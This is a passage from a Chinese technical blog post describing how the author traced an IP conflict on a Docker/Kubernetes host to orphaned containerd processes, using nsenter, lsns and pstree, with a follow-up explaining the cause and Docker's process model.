<p>这个时候，回到家，大家吃完饭，和用户通了一个电话，把所有的细节再重新梳理了一遍，这个时候，用户提供了一个比较关键的信息—— “<strong>抓包这个事，在 <code>docker0</code> 上可以抓到，然而到了容器内抓不到容器返回 <code>RST, ACK</code> </strong>” ！然而，根据我的知识，我知道在 <code>docker0</code> 和容器内的 <code>veth</code> 网卡上，中间再也没有什么网络设备了（参看《<a href="https://coolshell.cn/articles/17029.html" target="_blank" rel="noopener noreferrer">Docker基础技术：LINUX NAMESPACE（下）</a>》）!</p>
<p>于是这个事把我们逼到了最后一种情况 —— IP地址冲突了！</p>
<p>Linux下看IP地址冲突还不是一件比较简单事的，而在用户的生产环境下没有办法安装一些其它的命令，所以只能用已有的命令，这个时候，我们发现用户的机器上有 <code>arping</code> 于是我们用这个命令来检测有没有冲突的IP地址。使用了下面的命令：</p>
<p></p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW">$ arping -D -I docker0 -c 2 10.233.14.145
$ echo $?
</pre>
<p>根据文档，<code>-D</code> 参数是检测IP地址冲突模式，如果这个命令的退状态是 <code>0</code> 那么就有冲突。结果返回了 <code>1</code> 。而且，我们用 <code>arping</code> IP的时候，没有发现不同的mac地址。 <strong>这个时候，似乎问题的线索又断了</strong>。</p>
<p>因为客户那边还在处理一些别的事情，所以，我们在时断时续的情况下工作，而还一些工作都需要用户完成，所以，进展有点缓慢，但是也给我们一些时间思考问题。</p>
<h5>
<span class="ez-toc-section" id="%E6%9F%B3%E6%9A%97%E8%8A%B1%E6%98%8E"></span>柳暗花明<span class="ez-toc-section-end"></span>
</h5>
<p>现在我们知道，IP冲突的可能性是非常大的，但是我们找不出来是和谁的IP冲突了。而且，我们知道只要把这台机器重启一下，问题一定就解决掉了，但是我们觉得这并不是解决问题的方式，因为重启机器可以暂时的解决掉到这个问题，而如果我们不知道这个问题怎么发生的，那么未来这个问题还会再来。而重启线上机器这个成本太高了。</p>
<p>于是，我们的好奇心驱使我们继续调查。我让用户 <code>kubectl delete</code> 其中两个有问题的pod，因为本来就服务不断重启，所以，删掉也没有什么问题。删掉这两个pod后（一个是IP为 <code>10.233.14.145</code> 另一个是 <code>10.233.14.137</code>），我们发现，kubernetes在其它机器上重新启动了这两个服务的新的实例。然而，<strong>在问题机器上，这两个IP地址居然还可以ping得通</strong>。</p>
<p>好了，IP地址冲突的问题可以确认了。因为<code>10.233.14.xxx</code> 这个网段是 docker 的，所以，这个IP地址一定是在这台机器上。所以，我们想看看所有的 network namespace 下的 veth 网卡上的IP。</p>
<p>在这个事上，我们费了点时间，因为对相关的命令也 很熟悉，所以花了点时间Google，以及看相关的man。</p>
<ul>
<li>首先，我们到 <code>/var/run/netns</code>目录下查看系统的network namespace，发现什么也没有。</li>
<li>然后，我们到 <code>/var/run/docker/netns</code> 目录下查看Docker的namespace，发现有好些。</li>
<li>于是，我们用指定位置的方式查看Docker的network namespace里的IP地址</li>
</ul>
<p>这里要动用 <code>nsenter</code> 命令，这个命令可以进入到namespace里执行一些命令。比如</p>
<p></p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW">$ nsenter --net=/var/run/docker/netns/421bdb2accf1 ifconfig -a
</pre>
<p>上述的命令，到 <code>var/run/docker/netns/421bdb2accf1</code> 这个network namespace里执行了 <code>ifconfig -a</code> 命令。于是我们可以用下面 命令来遍历所有的network namespace。</p>
<p></p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW">$ ls /var/run/docker/netns | xargs -I {} nsenter --net=/var/run/docker/netns/{} ip addr 
</pre>
<p>然后，我们发现了比较诡异的事情。</p>
<ul>
<li>
<code>10.233.14.145</code> 我们查到了这个IP，说明，docker的namespace下还有这个IP。</li>
<li>
<code>10.233.14.137</code>，这个IP没有在docker的network namespace下查到。</li>
</ul>
<p>有namespace leaking？于是我上网查了一下，发现了一个docker的bug – 在docker remove/stop 一个容器的时候，没有清除相应的network namespace，这个问题被报告到了 <a href="https://github.com/moby/moby/issues/31597">Issue#31597</a> 然后被fix在了 <a href="https://github.com/moby/moby/pull/31996">PR#31996</a>，并Merge到了 Docker的 17.05版中。而用户的版本是 17.09，应该包含了这个fix。不应该是这个问题，感觉又走不下去了。</p>
<p>不过， <code>10.233.14.137</code> 这个IP可以ping得通，说明这个IP一定被绑在某个网卡，而且被隐藏到了某个network namespace下。</p>
<p>到这里，要查看所有network namespace，只有最后一条路了，那就是到 <code>/proc/</code> 目录下，把所有的pid下的 <code>/proc/&lt;pid&gt;/ns</code> 目录给穷举出来。好在这里有一个比较方便的命令可以干这个事 ： <code>lsns</code></p>
<p>于是我写下了如下的命令：</p>
<p></p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW">$ lsns -t net | awk ‘{print $4}' | xargs -t -I {} nsenter -t {}&amp;nbsp;-n ip addr | grep -C 4 "10.233.14.137"
</pre>
<p>解释一下。</p>
<ul>
<li>
<code>lsns -t net</code> 列出所有开了network namespace的进程，其第4列是进程PID</li>
<li>把所有开过network namespace的进程PID拿出来，转给 <code>xargs</code> 命令</li>
<li>由 <code>xargs</code> 命令把这些PID 依次传给 <code>nsenter</code> 命令，
<ul>
<li>
<code>xargs -t</code> 的意思是会把相关的执行命令打出来，这样我知道是那个PID。</li>
<li>
<code>xargs -I {}</code>  是声明一个占位符来替换相关的PID</li>
</ul>
</li>
</ul>
<p>最后，我们发现，虽然在 <code>/var/run/docker/netns</code> 下没有找到 <code>10.233.14.137</code> ，但是在 <code>lsns</code> 中找到了三个进程，他们都用了<code>10.233.14.137</code> 这个IP（冲突了这么多），<strong>而且他们的MAC地址全是一样的！</strong>（怪不得arping找不到）。通过<code>ps</code> 命令，可以查到这三个进程，有两个是java的，还有一个是<code>/pause</code> （这个应该是kubernetes的沙盒）。</p>
<p>我们继续乘胜追击，穷追猛打，用<code>pstree</code>命令把整个进程树打出来。发现上述的三个进程的父进程都在多个同样叫 <code>docker-contiane</code> 的进程下！</p>
<p><strong>这明显还是docker的，但是在<code>docker ps</code> 中却找不道相应的容器，什么鬼！快崩溃了……</strong></p>
<p>继续看进程树，发现，这些 <code>docker-contiane</code> 的进程的父进程不在 <code>dockerd</code> 下面，而是在 <code>systemd</code> 这个超级父进程PID 1下，我靠！进而发现了一堆这样的野进程（这种野进程或是僵尸进程对系统是有害的，至少也是会让系统进入亚健康的状态，因为他们还在占着资源）。</p>
<p><code>docker-contiane</code> 应该是 <code>dockerd</code> 的子进程，被挂到了 <code>pid 1</code> 只有一个原因，那就是父进程“飞”掉了，只能找 pid 1 当养父。这说明，这台机器上出现了比较严重的 <code>dockerd</code> 进程退出的问题，而且是非常规的，因为 <code>systemd</code> 之所以要成为 pid 1，其就是要监管所有进程的子子孙孙，居然也没有管理好，说明是个非常规的问题。（注，关于 systemd，请参看《<a href="https://coolshell.cn/articles/17998.html" target="_blank" rel="noopener noreferrer">Linux PID 1 和 Systemd </a>》，关于父子进程的事，请参看《Unix高级环境编程》一书）</p>
<p>接下来就要看看 <code>systemd</code> 为 <code>dockerd</code> 记录的日志了…… （然而日志只有3天的了，这3天<code>dockerd</code>没有任何异常）</p>
<h4>
<span class="ez-toc-section" id="%E6%80%BB%E7%BB%93"></span>总结<span class="ez-toc-section-end"></span>
</h4>
<p>通过这个调查，可以总结一下，</p>
<p>1） 对于问题调查，需要比较扎实的基础知识，知道问题的成因和范围。</p>
<p>2）如果走不下去了，要重新梳理一下，回头仔细看一下一些蛛丝马迹，认真推敲每一个细节。</p>
<p>3） 各种诊断工具要比较熟悉，这会让你事半功倍。</p>
<p>4）系统维护和做清洁比较类似，需要经常看看系统中是否有一些僵尸进程或是一些垃圾东西，这些东西要及时清理掉。</p>
<p>最后，多说一下，很多人都说，<strong>Docker适合放在物理机内运行，这并不完全对，因为他们只考虑到了性能成本，没有考虑到运维成本，在这样512GB中启动几百个容器的玩法，其实并不好，因为这本质上是个大单体，因为你一理要重启某些关键进程或是机器，你的影响面是巨大的</strong>。</p>
<p> </p>
<p>———————— 更新 2018/12/10 —————————</p>
<h4>
<span class="ez-toc-section" id="%E9%97%AE%E9%A2%98%E5%8E%9F%E5%9B%A0"></span>问题原因<span class="ez-toc-section-end"></span>
</h4>
<p>这两天在自己的环境下测试了一下，发现，只要是通过 <code>systemctl start/stop docker</code> 这样的命令来启停 Docker， 是可以把所有的进程和资源全部干掉的。这个是没有什么问题的。我唯一能重现用户问题的的操作就是直接 <code>kill -9 &lt;dockerd pid&gt;</code> 但是这个事用户应该不会干。而 Docker 如果有 crash 事件时，Systemd 是可以通过 <code>journalctl -u docker</code> 这样的命令查看相关的系统日志的。</p>
<p>于是，我找用户了解一下他们在Docker在启停时的问题，用户说，<strong>他们的执行 <code>systemctl stop docker</code> 这个命令的时候，发现这个命令不响应了，有可能就直接按了 <code>Ctrl +C</code> 了</strong>！</p>
<p>这个应该就是导致大量的 <code>docker-containe</code> 进程挂到 <code>PID 1</code> 下的原因了。前面说过，用户的一台物理机上运行着上百个容器，所以，那个进程树也是非常庞大的，我想，停服的时候，系统一定是要遍历所有的docker子进程来一个一个发退出信号的，这个过程可能会非常的长。导致操作员以为命令假死，而直接按了 <code>Ctrl + C</code> ，最后导致很多容器进程并没有终止……</p>
<p> </p>
<h4>
<span class="ez-toc-section" id="%E5%85%B6%E5%AE%83%E4%BA%8B%E5%AE%9C"></span>其它事宜<span class="ez-toc-section-end"></span>
</h4>
<p>有同学问，为什么我在这个文章里写的是 <code>docker-containe</code> 而不是 <code>containd</code> 进程？这是因为被 <code>pstree</code> 给截断了，用 <code>ps</code> 命令可以看全，只是进程名的名字有一个 <code>docker-</code>的前缀。</p>
<p>下面是这两种不同安装包的进程树的差别（其中 <code>sleep</code> 是我用 <code>buybox</code> 镜像启动的）</p>
<p></p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW">systemd───dockerd─┬─docker-contained─┬─3*[docker-contained-shim─┬─sleep]
                  │                 │                    └─9*[{docker-containe}]]
                  │                 ├─docker-contained-shim─┬─sleep
                  │                 │                 └─10*[{docker-containe}]
                  │                 └─14*[{docker-contained-shim}]
                  └─17*[{dockerd}]
</pre>
<p></p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW">systemd───dockerd─┬─containerd─┬─3*[containerd-shim─┬─sleep]
                  │            │                 └─9*[{containerd-shim}]
                  │            ├─2*[containerd-shim─┬─sleep]
                  │            │                    └─9*[{containerd-shim}]]
                  │            └─11*[{containerd}]
                  └─10*[{dockerd}]

</pre>
<p>顺便说一下，自从 Docker 1.11版以后，Docker进程组模型就改成上面这个样子了.</p>
<ul>
<li>
<code>dockerd</code> 是 Docker Engine守护进程，直接面向操作用户。<code>dockerd</code> 启动时会启动 <code>containerd</code> 子进程，他们之前通过RPC进行通信。</li>
<li>
<code>containerd</code> 是<code>dockerd</code>和<code>runc</code>之间的一个中间交流组件。他与 <code>dockerd</code> 的解耦是为了让Docker变得更为的中立，而支持OCI 的标准 。</li>
<li>
<code>containerd-shim</code>  是用来真正运行的容器的，每启动一个容器都会起一个新的shim进程， 它主要通过指定的三个参数：容器id，boundle目录（containerd的对应某个容器生成的目录，一般位于：<code>/var/run/docker/libcontainerd/containerID</code>）， 和运行命令（默认为 <code>runc</code>）来创建一个容器。</li>
<li>
<code>docker-proxy</code> 你有可能还会在新版本的Docker中见到这个进程，这个进程是用户级的代理路由。只要你用 <code>ps -elf</code> 这样的命令把其命令行打出来，你就可以看到其就是做端口映射的。如果你不想要这个代理的话，你可以在 <code>dockerd</code> 启动命令行参数上加上：  <code>--userland-proxy=false</code> 这个参数。</li>
</ul>
<p>更多的细节，大家可以自行Google。这里推荐两篇文章：</p>
<ul>
<li><a href="https://hackernoon.com/docker-containerd-standalone-runtimes-heres-what-you-should-know-b834ef155426" target="_blank" rel="noopener noreferrer">Docker, Containerd &amp; Standalone Runtimes — Here’s What You Should Know</a></li>
<li><a href="http://alexander.holbreich.org/docker-components-explained/" target="_blank" rel="noopener noreferrer">Docker components explained</a></li>
</ul>
<p>（全文完）</p>
<div style="margin-top: 15px; font-size: 11px;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
 ]]></content>
<pubDate>2018-12-08T11:57:35+08:00</pubDate>
<guid>https://coolshell.cn/articles/18654.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
</channel>
</rss>
